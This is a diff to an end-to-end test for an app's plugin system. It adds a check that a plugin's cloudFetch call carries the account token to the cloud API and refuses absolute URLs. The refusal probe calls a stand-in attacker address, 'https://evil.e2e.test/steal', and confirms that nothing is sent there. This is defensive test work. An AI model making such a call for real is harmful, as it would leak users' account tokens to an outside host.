@@ -12,6 +12,8 @@
  *   3. 刷新 → 插件仍在、仍启用;再运行一次 → loadData 读回上次写的计数(数据跨重载);插件 Space 仍在 Space 条
  *   4. 第二项声明 isDesktopOnly → 安装被拒,错误提示 = 本地化原因;什么都没落盘
  *   5. 设置 → 插件:关掉 → 命令、视图与它的 Space 消失;卸载 → 文件没了(listPlugins / marketInstalled 都看不到)
+ *   2c. 插件以当前账号调 Forsion 云端(window.tangu.cloudFetch,桌面同一个接口):带着账号令牌打到云端 API、
+ *       拿回 { status, json };给绝对地址 → 不发请求、回 bad_path(通话室 / 活动这类插件缺了它整个不能用)
  *
  * 负对照:`npm run e2e:plugins -- --negative` 把页面 CSP 里的 'unsafe-eval' 去掉再跑 —— 插件代码求值被拦,
  * 第 2 步必须红(证明这台仪器真的在测「插件代码跑起来了」,不是只测到「文件写进去了」)。
@@ -55,6 +57,16 @@ ctx.registerView({
     const box = document.createElement('div')
     box.setAttribute('data-e2e-plugin-view', '')
     box.setAttribute('data-e2e-runs', String(d.runs))
+    // 云端接口探针(2c):插件眼里有没有这个接口、打得通吗、绝对地址拦不拦。
+    const tg = window.tangu
+    const probe = { seam: typeof (tg && tg.cloudFetch) }
+    if (probe.seam === 'function') {
+      try {
+        probe.ok = await tg.cloudFetch({ path: '/e2e/ping', method: 'POST', body: { n: 7 } })
+        probe.abs = await tg.cloudFetch({ path: 'https://evil.e2e.test/steal' })
+      } catch (e) { probe.thrown = String(e && e.message || e) }
+    }
+    box.setAttribute('data-e2e-cloudfetch', JSON.stringify(probe))
     box.textContent = 'E2E plugin view, runs=' + d.runs
     el.appendChild(box)
     return () => box.remove()
@@ -199,6 +211,13 @@ async function main() {
       }
       return json({}, 404)
     })
+    // 2c 的假云端接口:把收到的令牌与请求体原样回显。绝对地址那一发要是真发出去了,记下来。
+    const evilHits = []
+    await page.route('**/api/e2e/ping', (r) => r.fulfill({
+      status: 200, contentType: 'application/json',
+      body: JSON.stringify({ pong: true, auth: r.request().headers().authorization || null, body: r.request().postData() }),
+    }))
+    await page.route('https://evil.e2e.test/**', (r) => { evilHits.push(r.request().url()); return r.fulfill({ status: 200, body: '{}' }) })
     await page.route(`${CDN}/**`, (r) => {
       const id = path.basename(new URL(r.request().url()).pathname, '.zip')
       const body = zips[id]
@@ -307,6 +326,15 @@ async function main() {
     check(runs1 === '1', '运行命令 → 打开插件视图(锚点在、saveData 写入 runs=1)', `runs=${runs1}`)
     if (!ran1) await closePalette()
     await shot('plugin-view')
+
+    // 2c. 插件调云端
+    const probe = JSON.parse((await page.locator('[data-e2e-cloudfetch]').first().getAttribute('data-e2e-cloudfetch').catch(() => null)) || '{}')
+    check(probe.seam === 'function', '插件拿得到 window.tangu.cloudFetch', `typeof = ${probe.seam}`)
+    const okRes = probe.ok || {}
+    check(okRes.status === 200 && okRes.json && okRes.json.pong === true && okRes.json.auth === 'Bearer e2e-plugins' && okRes.json.body === '{"n":7}',
+      'cloudFetch:带账号令牌打到云端 API,拿回 { status, json }', JSON.stringify(probe.ok ?? probe.thrown ?? null))
+    const absRes = probe.abs || {}
+    check(absRes.status === 0 && absRes.error === 'bad_path' && evilHits.length === 0, 'cloudFetch:绝对地址不发请求,回 bad_path', `${JSON.stringify(probe.abs ?? null)},发往外站 ${evilHits.length} 次`)
 
     // 2b. 包里带的 Space:宿主读得出配方 → 不刷新就进 Space 条 → 切过去,主区是配方点名的插件视图
     const recipes = await page.evaluate(async () => {
